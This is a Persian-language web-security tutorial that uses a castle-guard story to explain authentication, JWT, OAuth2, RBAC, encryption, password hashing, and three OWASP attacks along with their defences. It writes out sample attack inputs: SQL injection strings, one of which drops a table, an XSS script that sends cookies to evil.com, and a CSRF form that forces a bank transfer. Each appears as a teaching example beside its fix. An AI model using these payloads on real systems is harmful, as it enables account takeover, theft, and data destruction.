# سطح ۲ — قصه‌ی دقیق: پشت صحنه‌ی قلعه‌ی سام 🔍🏰

> همان قصه‌ی سامِ نگهبان، اما این بار **پرده را کنار می‌زنیم** و می‌بینیم هر بخش قصه در دنیای واقعیِ امنیتِ نرم‌افزار *دقیقاً* چطور اتفاق می‌افتد. اسم‌های فنی را کم‌کم وارد می‌کنیم.

---

## صحنه‌ی ۱ — نگهبانِ دروازه واقعاً کیست؟ (Authentication)

در دنیای واقعی، «قلعه» همان **برنامه‌ی وب** (Web Application) توست، «اهالی قلعه» **کاربران**، و سامِ نگهبان همان کدی است که جلوی در ایستاده. کارِ دمِ دروازه — یعنی «تو واقعاً کی هستی؟» — اسم فنی‌اش **احراز هویت** (Authentication یا کوتاه‌شده **AuthN**) است.

| در قصه | در دنیای واقعی |
|---|---|
| سام صورتت را نگاه می‌کند | کاربر username + password می‌دهد |
| «همانی هستی که می‌گویی؟» | سرور هویت را تأیید می‌کند |
| در باز می‌شود | کاربر «وارد شده» (logged in) محسوب می‌شود |

اما یک مشکل هست: وب **فراموش‌کار** است (Stateless — یادت هست از فصل شبکه؟). هر درخواست برای سرور مثل بارِ اول است! پس سام چطور یادش بماند که این کاربر قبلاً خودش را ثابت کرده و لازم نیست هر بار رمز بپرسد؟ سه راه داریم:

### راه ۱: دفترچه‌ی نگهبان (Session)

سام یک **دفترچه** دارد. وقتی کسی برای اولین بار خودش را ثابت کرد، سام در دفترش می‌نویسد: «شماره‌ی ۷ = بازرگان، وارد شده» و به او یک **پلاکِ شماره‌دار** می‌دهد. دفعه‌ی بعد طرف فقط پلاک را نشان می‌دهد؛ سام شماره را در دفترش پیدا می‌کند و می‌شناسدش.

- **دفترچه‌ی سام** = **Session** (داده‌ی سمت سرور: کاربر کیست، چه اجازه‌هایی دارد)
- **پلاک** = **Session Cookie** (در مرورگر کاربر؛ فقط یک *شناسه* است، نه خودِ داده)

نکته: دفتر در سرور است. اگر سرورها زیاد شوند، یا باید دفتر را مشترک کنند (مثلاً در **Redis**) یا کاربر همیشه پیش همان نگهبان برگردد.

### راه ۲: پلاکِ مُهردارِ خودکفا (JWT)

راهِ مدرن‌تر: به‌جای اینکه سام دفتر نگه دارد، یک **پلاکِ مُهردار** بدهد که **همه‌چیز رویش نوشته شده** و دیگر نیازی به دفتر نباشد. این **JWT** (JSON Web Token) است.

پلاک سه بخش دارد که با نقطه از هم جدا می‌شوند:

```
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiYmF6YXJnYW4iLCJyb2xlIjoiY2hlZiJ9 . SflKxwRJSMeKKF2QT4
└────── header ──────┘ └──────────────── payload ────────────────┘ └──── signature ───┘
```

| بخش | چه چیزی رویش نوشته | در قصه |
|---|---|---|
| **header** | نوع توکن و الگوریتمِ امضا | «این یک پلاکِ رسمیِ قلعه است» |
| **payload** | کاربر کیست، چه نقشی دارد، تا کی معتبر است | «بازرگان، نقش: آشپز، انقضا: غروب» |
| **signature** | امضای محرمانه‌ی سرور روی دو بخش بالا | مُهرِ مخصوصِ سام که جعل نمی‌شود |

نکته‌ی حیاتی: header و payload فقط **base64** هستند، یعنی **هر کسی می‌تواند بخواندشان** — رمز نشده‌اند! امنیت از **امضا** می‌آید: اگر کسی payload را دستکاری کند (مثلاً نقشش را از «آشپز» به «شاه» عوض کند)، امضا دیگر نمی‌خواند و سام می‌فهمد جعلی است.

> ⚖️ معامله‌ی JWT: چون همه‌چیز رویِ خودِ پلاک است، سرور **دفتر لازم ندارد** (stateless و مقیاس‌پذیر). اما عیبش این است که **نمی‌توان یک پلاکِ صادرشده را پس گرفت** — تا وقتی منقضی نشده، معتبر است! برای همین:
> - عمرش را **کوتاه** می‌گذارند (مثلاً ۱۵ دقیقه) → **access token**
> - یک **refresh token** با عمرِ طولانی‌تر می‌دهند که با آن می‌توان access token تازه گرفت
> - برای «خروج فوری» مجبوریم یک **blocklist** نگه داریم — که نیمی از سادگیِ stateless بودن را خراب می‌کند!

### راه ۳: ورودِ مهمان از طریقِ کارگزارِ معتمد (OAuth2)

فرض کن یک مهمان می‌خواهد وارد قلعه شود، اما **نمی‌خواهد رمزِ خانه‌ی خودش را به سام بدهد**. حقش هم هست! چرا باید رمزِ گاوصندوقش را به یک نگهبانِ غریبه بسپارد؟

اینجا **OAuth2** وارد می‌شود. این همان کاری است که «با گوگل وارد شوید» می‌کند. به‌جای دادنِ رمز، یک **کارگزارِ معتمد** (مثلاً گوگل) وسط می‌آید:

نقش‌ها (Roles):

| نقش OAuth2 | در قصه |
|---|---|
| **Resource Owner** | خودِ مهمان (صاحبِ اطلاعات) |
| **Client** | قلعه‌ی سام (برنامه‌ای که می‌خواهد دسترسی بگیرد) |
| **Authorization Server** | کارگزارِ معتمد (گوگل) که هویت را تأیید می‌کند |
| **Resource Server** | جایی که داده‌ها هستند (مثلاً Gmail API) |

جریانِ استانداردش **Authorization Code Flow** است:

```
کاربر روی «ورود با گوگل» در قلعه‌ی سام کلیک می‌کند
   │
   ▼
١. قلعه کاربر را به گوگل می‌فرستد:  «این کاربر می‌خواهد وارد شود»
   │
   ▼
٢. کاربر رمزش را *فقط به گوگل* می‌دهد (نه به سام!) و رضایت می‌دهد
   │
   ▼
٣. گوگل کاربر را به قلعه برمی‌گرداند + یک «code» یک‌بارمصرف
   │
   ▼
٤. قلعه پشتِ صحنه (server-to-server) code را به گوگل می‌دهد
   │      «این code را دادی، توکن بده»  + client_secret
   ▼
٥. گوگل یک access token به قلعه می‌دهد
   │
   ▼
٦. قلعه با آن توکن از Gmail داده می‌گیرد — بدون اینکه هیچ‌وقت رمز کاربر را دیده باشد ✅
```

> نکته‌ی مصاحبه: «چرا code می‌دهند نه مستقیم token؟» چون code از مرورگرِ کاربر (که قابلِ شنود است) رد می‌شود، اما token در یک کانالِ امنِ پشت‌صحنه‌ای (server-to-server) با `client_secret` گرفته می‌شود. حتی اگر کسی code را بدزدد، بدون `client_secret` بی‌فایده است. (نسخه‌ی موبایل/SPA از **PKCE** برای همین حفاظت استفاده می‌کند.)

## صحنه‌ی ۲ — اتاق گنج: شناختن ≠ اجازه دادن (Authorization)

اینجا مهم‌ترین تمایزِ امنیت است. اینکه سام کسی را **می‌شناسد** (AuthN)، اصلاً به این معنی نیست که او **اجازه** دارد هر کاری بکند. «چه کاری مجازی؟» اسم فنی‌اش **اجازه‌دهی** (Authorization یا **AuthZ**) است.

| | Authentication (AuthN) | Authorization (AuthZ) |
|---|---|---|
| سؤال | «تو کی هستی؟» | «اجازه داری این کار را بکنی؟» |
| در قصه | نگهبانِ دروازه | درِ اتاق گنج |
| چه وقت | اول | بعد از شناختن |
| شکست | `401 Unauthorized` | `403 Forbidden` |

(یادت هست از فصل شبکه؟ `401` = «نمی‌شناسمت»، `403` = «می‌شناسمت ولی حق نداری».)

### RBAC — اجازه بر اساس نقش

قلعه شلوغ است؛ سام نمی‌تواند برای هر آدم جداگانه تصمیم بگیرد. پس آدم‌ها را **نقش** (Role) می‌دهد و به هر نقش یک دسته **اجازه** (Permission):

```
نقش‌ها:        آشپز         سرباز          شاه
              │            │              │
اجازه‌ها:   آشپزخانه    دیوارِ قلعه    اتاقِ گنج
            انبارِ غذا   اسلحه‌خانه      همه‌چیز
```

این **RBAC** است (Role-Based Access Control): کاربر → نقش → اجازه‌ها. به‌جای اینکه به علی بگوییم «حق داری وارد آشپزخانه شوی»، می‌گوییم «علی آشپز است» و «آشپزها به آشپزخانه راه دارند». اگر علی ترفیع گرفت، فقط نقشش را عوض می‌کنیم.

```python
# نمونه‌ی ساده‌ی بررسی اجازه
ROLE_PERMISSIONS = {
    "chef":    {"kitchen:read", "pantry:write"},
    "soldier": {"wall:guard", "armory:read"},
    "king":    {"treasury:open", "*"},   # شاه همه‌چیز
}

def can(user, permission):
    perms = ROLE_PERMISSIONS.get(user.role, set())
    return permission in perms or "*" in perms

# درِ اتاق گنج:
if not can(current_user, "treasury:open"):
    return Response(status=403)   # می‌شناسمت، ولی حق نداری
```

> نکته‌ی مصاحبه: رایج‌ترین اشتباه **IDOR** است (Insecure Direct Object Reference) — کاربر A لینکِ `/orders/123` را به `/orders/124` عوض می‌کند و سفارشِ کاربر B را می‌بیند، چون کد فقط چک کرده «وارد شده‌ای؟» (AuthN) ولی نه «این سفارش مالِ خودت است؟» (AuthZ). همیشه **مالکیت** را هم چک کن، نه فقط لاگین را.

## صحنه‌ی ۳ — پیام‌های رمزی (Encryption)

شاه نامه‌ها را رمز می‌کرد. اسم فنی‌اش **رمزنگاری** (Encryption) است: تبدیلِ متنِ خوانا (plaintext) به متنِ به‌هم‌ریخته (ciphertext) با یک **کلید**، جوری که فقط دارنده‌ی کلید بتواند برش گرداند. دو خانواده داریم:

### رمزنگاری متقارن (Symmetric) — یک کلیدِ مشترک

هر دو طرف **یک کلیدِ یکسان** دارند؛ همان کلید هم قفل می‌کند هم باز. مثلِ یک صندوقچه‌ای که یک کلید دارد و کپیِ کلید دستِ هر دو نفر است.

- الگوریتمِ استاندارد: **AES** (مثلاً AES-256-GCM)
- **سریع** است → برای رمزِ حجمِ زیادِ داده (فایل، دیسک، کلِ ترافیکِ TLS)
- مشکل: کلید را **چطور به طرفِ مقابل برسانیم** بدون اینکه لو برود؟

### رمزنگاری نامتقارن (Asymmetric) — دو کلیدِ جفت

هر کس **دو کلیدِ جفت** دارد: یک **کلیدِ عمومی** (public — به همه می‌دهی) و یک **کلیدِ خصوصی** (private — پیشِ خودت). چیزی که با عمومی قفل شود، فقط با خصوصی باز می‌شود و برعکس.

- الگوریتم: **RSA** یا **ECC**
- **کند** است → برای حجمِ کم
- مشکلِ توزیعِ کلید را حل می‌کند: من کلیدِ عمومیت را برمی‌دارم و چیزی برایت قفل می‌کنم که فقط تو بازش کنی — بی‌آنکه قبلاً کلیدِ مشترکی رد و بدل کرده باشیم.

| | متقارن (AES) | نامتقارن (RSA) |
|---|---|---|
| کلید | یکی، مشترک | جفت (عمومی + خصوصی) |
| سرعت | سریع | کند |
| مشکلِ اصلی که حل می‌کند | رمزِ سریعِ حجمِ زیاد | توزیعِ کلید + امضا |
| کاربردِ نمونه | دیتای داخلِ TLS، دیسک | تبادلِ کلید، امضای دیجیتال |

> **در عمل هر دو با هم کار می‌کنند** (همان TLS فصلِ شبکه!): نامتقارن (RSA) فقط برای تبادلِ یک کلیدِ متقارنِ مشترک استفاده می‌شود، بعد همه‌ی دیتا با AESِ سریع رمز می‌شود. بهترینِ هر دو دنیا.

## صحنه‌ی ۴ — آسیابِ جادویی: رمز را هرگز دست‌نخورده نگه‌دار (Hashing)

اینجا یک اشتباهِ کشنده هست که باید بفهمی: **رمزِ عبورِ کاربران را هرگز رمزنگاری (encrypt) نمی‌کنیم!** چون رمزنگاری دو طرفه است — کلید لو برود، همه‌ی رمزها برمی‌گردند. به‌جایش از **آسیابِ یک‌طرفه** استفاده می‌کنیم: **Hashing**.

| ویژگی | در قصه (آسیاب) | در واقعیت (Hash) |
|---|---|---|
| یک‌طرفه | آرد را نمی‌شود گندم کرد | از hash نمی‌توان به ورودی رسید |
| یکتا | هر چیز، گردِ متفاوت | تغییرِ یک حرف، hashِ کاملاً متفاوت |
| تکرارپذیر | همان گندم، همان آرد | همان ورودی، همان hash |

پس سام **خودِ رمز را ذخیره نمی‌کند**، فقط hashش را. موقعِ ورود، رمزِ واردشده را hash می‌کند و دو hash را مقایسه می‌کند.

### چرا MD5 و SHA1 ممنوع‌اند (برای رمز عبور)؟

این‌ها برای رمزِ عبور **خیلی سریع‌اند** — و این بد است! یک مهاجم با یک کارتِ گرافیک می‌تواند **میلیاردها** حدس در ثانیه بزند و با جدولِ از پیش‌ساخته (rainbow table) رمزها را بشکند.

### راه‌حل ۱: نمک (Salt)

اگر دو نفر رمزِ یکسان داشته باشند، hashشان هم یکی می‌شود — و مهاجم می‌فهمد. پس به هر رمز یک **نمکِ تصادفیِ یکتا** اضافه می‌کنیم قبل از hash. حالا حتی دو رمزِ یکسان، hashِ متفاوت دارند، و جدولِ آماده بی‌فایده می‌شود.

### راه‌حل ۲: الگوریتمِ *کُند* و *عمدی‌سخت*

برای رمز عبور از **bcrypt** یا **argon2** استفاده می‌کنیم — این‌ها **عمداً کُندند** و یک پارامترِ «هزینه/cost» دارند که می‌توانی سخت‌ترش کنی. برای کاربرِ واقعی ۰.۲ ثانیه تأخیر مهم نیست، اما برای مهاجم یعنی به‌جای میلیاردها، فقط چند هزار حدس در ثانیه. (نکته: bcrypt نمک را **خودش تولید و داخلِ خروجی ذخیره می‌کند**.)

```python
# ❌ غلط — یک‌طرفه ولی فوق‌العاده سریع و بدونِ نمک
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()   # هرگز!

# ✅ درست — کُند، با نمکِ خودکار
import bcrypt
pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())   # ذخیره کن
# هنگام ورود:
ok = bcrypt.checkpw(entered_password.encode(), pw_hash)        # True/False
```

> جمع‌بندیِ کلیدی: **داده‌ای که باید برگردد را encrypt کن (دوطرفه)؛ رمزِ عبور را hash کن (یک‌طرفه، با bcrypt/argon2 + salt).**

## صحنه‌ی ۵ — سه حقه‌ی بزرگ (OWASP Top 10)

بنیادی به نام **OWASP** هر چند سال **۱۰ خطرِ بزرگِ امنیتِ وب** را فهرست می‌کند. سه حقه‌ی قصه‌ی ما (ورق‌پاره، آینه، نامه‌ی جعلی) جزوِ همین‌هایند. نگاهی کلی:

| # | خطر | یک‌خطی |
|---|---|---|
| A01 | Broken Access Control | همان اتاقِ گنجِ بی‌قفل (IDOR و ...) |
| A02 | Cryptographic Failures | رمزِ ضعیف یا رمزِ عبورِ ذخیره‌شده‌ی لخت |
| A03 | **Injection** | ورق‌پاره‌ی نقشه‌دار (SQLi، و XSS هم اینجاست) |
| A04 | Insecure Design | نقصِ امنیتی در خودِ طراحی |
| A05 | Security Misconfiguration | تنظیماتِ پیش‌فرض/افشای خطا |
| A06 | Vulnerable Components | کتابخانه‌ی قدیمیِ پر از حفره |
| A07 | Auth Failures | نگهبانِ ضعیفِ دروازه |
| A08 | Data Integrity Failures | به‌روزرسانیِ بی‌امضا، CI/CD آلوده |
| A09 | Logging/Monitoring Failures | دوربینِ مداربسته نداشتن |
| A10 | SSRF | وادار کردنِ سرور به زدنِ درِ خودی‌ها |

حالا سه حقه‌ی قصه را با جزئیات باز کنیم.

### حقه‌ی اول: ورق‌پاره‌ی نقشه‌دار → SQL Injection

یادت هست؟ مهمان یک ورق داد که نیمش پیام بود و نیمش **دستورِ پنهان**، و آشپز همه را با هم اجرا کرد. در دنیای واقعی این **SQL Injection** است: وقتی ورودیِ کاربر را **مستقیم وسطِ دستورِ دیتابیس می‌چسبانیم**، کاربر می‌تواند دستورِ خودش را تزریق کند.

```python
# ❌ آسیب‌پذیر — ورودی مستقیم چسبیده به دستور
name = request.args["name"]
db.execute("SELECT * FROM users WHERE name = '" + name + "'")
# اگر کاربر بنویسد:  ' OR '1'='1
# دستور می‌شود:  SELECT * FROM users WHERE name = '' OR '1'='1'   → همه‌ی کاربران!
# یا بدتر:  '; DROP TABLE users; --   → کلِ جدول پاک می‌شود
```

**راه‌حل: Parameterized Queries (Prepared Statements)**

به‌جای چسباندن، **جای خالی** می‌گذاریم و داده را جداگانه می‌دهیم. حالا دیتابیس داده را همیشه **به‌عنوان داده** می‌بیند، نه دستور — دقیقاً مثلِ جدا نگه‌داشتنِ «حرفِ مهمان» از «دستورِ واقعی».

```python
# ✅ امن — جای خالی (placeholder)، داده جدا
db.execute("SELECT * FROM users WHERE name = ?", (name,))
# هرچه کاربر بنویسد، فقط یک رشته‌ی جستجوست — هرگز دستور نمی‌شود
```

### حقه‌ی دوم: آینه‌ی نفرین‌شده → XSS (Cross-Site Scripting)

آینه‌ای که یک نفر گذاشت و در گوشِ **همه‌ی** بینندگان زمزمه کرد. در وب این **XSS** است: مهاجم **کدِ جاوااسکریپتِ** خودش را در صفحه‌ای می‌گنجاند که مرورگرِ کاربرانِ دیگر آن را **اجرا** می‌کند (دزدیِ کوکی، تغییرِ صفحه، ...). دو نوعِ اصلی:

| نوع | در قصه | چطور |
|---|---|---|
| **Stored XSS** | آینه که شبانه در حیاطِ عمومی **کاشته شد** | کدِ بد در دیتابیس ذخیره می‌شود (مثلاً در کامنت) و به *هر* بیننده سرو می‌شود — خطرناک‌تر |
| **Reflected XSS** | یک آینه‌ی دستی که فقط جلوی *یک* قربانی می‌گیرند | کدِ بد در URL/جستجوست و فقط به همان قربانیِ کلیک‌کننده بازتاب می‌شود |

```html
<!-- ❌ آسیب‌پذیر — کامنتِ کاربر مستقیم در HTML -->
<div>{{ comment }}</div>
<!-- اگر کاربر بنویسد:  <script>fetch('//evil.com?c='+document.cookie)</script>
     این اسکریپت در مرورگرِ هر بیننده اجرا می‌شود! -->
```

**راه‌حل‌ها:**
1. **Output Encoding / Escaping**: قبل از نمایش، کاراکترهای خطرناک را خنثی کن (`<` → `&lt;`). اکثرِ فریم‌ورک‌های مدرن (React, Jinja2 با autoescape) **پیش‌فرض** این کار را می‌کنند — مگر اینکه عمداً دورش بزنی (`dangerouslySetInnerHTML`, `|safe`).
2. **Content Security Policy (CSP)**: یک هدر که به مرورگر می‌گوید «فقط اسکریپتِ خودی را اجرا کن» — مثلِ قانونی که می‌گوید هیچ آینه‌ای جز آینه‌های تأییدشده اجازه‌ی زمزمه ندارند.
3. کوکیِ نشست را **HttpOnly** کن تا حتی اگر XSS رخ داد، جاوااسکریپت نتواند کوکی را بدزدد.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

### حقه‌ی سوم: نامه‌ی جعلیِ مُهردار → CSRF

نامه‌ای که مُهرِ شاه را داشت ولی شاه ننوشته بود. در وب این **CSRF** است (Cross-Site Request Forgery): یک سایتِ مهاجم، مرورگرِ قربانی را وادار می‌کند **به‌جایِ او** یک درخواست به سایتِ معتبر بفرستد — و چون مرورگر کوکیِ نشست را **خودکار** می‌چسباند (همان «مُهرِ آشنا»)، سرور فکر می‌کند خودِ کاربر است.

```html
<!-- در یک سایتِ مهاجم؛ کافی است قربانیِ لاگین‌کرده بازش کند -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
<!-- مرورگرِ قربانی کوکیِ bank.com را خودکار می‌فرستد → پول منتقل می‌شود! -->
```

**راه‌حل‌ها (مثلِ رمزِ روزانه‌ی سام):**
1. **CSRF Token**: سرور یک توکنِ تصادفیِ غیرقابل‌حدس در فرم می‌گذارد. سایتِ مهاجم آن را **نمی‌داند**، پس درخواستِ جعلی توکن ندارد و رد می‌شود — دقیقاً مثلِ رمزِ روزانه که نامه‌ی جعلی نداشت.
2. **`SameSite` Cookie**: به مرورگر بگو کوکیِ نشست را در درخواست‌هایی که از **سایتِ دیگری** شروع شده‌اند **نفرست**:
   - `SameSite=Lax` (پیش‌فرضِ مدرن، تعادلِ خوب)
   - `SameSite=Strict` (سخت‌گیرانه‌تر)

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
```

> نکته‌ی مصاحبه: فرقِ XSS و CSRF؟ **XSS** کدِ مهاجم را در *مرورگرِ قربانی اجرا می‌کند* (مشکلِ اعتماد به محتوا). **CSRF** کاری نمی‌کند جز اینکه *از اعتبارِ موجودِ قربانی سوءاستفاده می‌کند* (مشکلِ اعتماد به منشأِ درخواست). جالب اینکه اگر XSS داشته باشی، CSRF token هم بی‌فایده می‌شود — چون اسکریپتِ مهاجم می‌تواند توکن را بخواند! پس XSS را اول ببند.

```
   │

       ├─ SQLi  → Parameterized Queries

       └─ CSRF  → CSRF Token + SameSite
   │
   ▼
قلعه‌ای امن و آبرومند 🏰✅
```
